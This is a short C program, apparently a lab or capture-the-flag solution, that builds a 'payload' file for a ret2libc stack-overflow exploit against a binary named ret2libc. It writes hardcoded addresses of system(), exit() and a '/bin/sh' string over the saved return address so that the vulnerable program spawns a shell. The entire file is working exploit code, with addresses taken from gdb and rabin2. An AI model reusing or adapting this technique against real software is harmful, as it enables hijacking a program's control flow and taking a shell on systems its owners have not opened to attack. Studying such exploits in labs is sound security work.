#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buf[40];
	FILE *out;

	out = fopen("payload", "w+");

	// It helps when creating these things in GDB if you can see where in
	// the buffer you are.
	char i;
	for (i = 0; i < 40; i++) buf[i] = i;

	long *bin_sh_p = (long *) 0x08048657; // rabin2 -z ret2libc
	long *system_p = (long *) 0xb7e628f0; // from gdb: disas system
	long *exit_p   = (long *) 0xb7e55530; // from gdb: disas exit

	// System overwrites the saved instruction pointer
	size_t system_off = 0x18;
	size_t exit_off   = 0x1c;
	size_t bin_sh_off = 0x20;

	printf("buffer[%02lu] = %p\n", bin_sh_off, bin_sh_p);
	printf("buffer[%02lu] = %p\n", system_off, system_p);
	printf("buffer[%02lu] = %p\n", exit_off, exit_p);

	*((long *) &(buf[bin_sh_off])) = bin_sh_p;
	*((long *) &(buf[system_off])) = system_p;
	*((long *) &(buf[exit_off]  )) = exit_p;

	fwrite(buf, sizeof(buf), 1, out);
	fclose(out);

	return EXIT_SUCCESS;
}
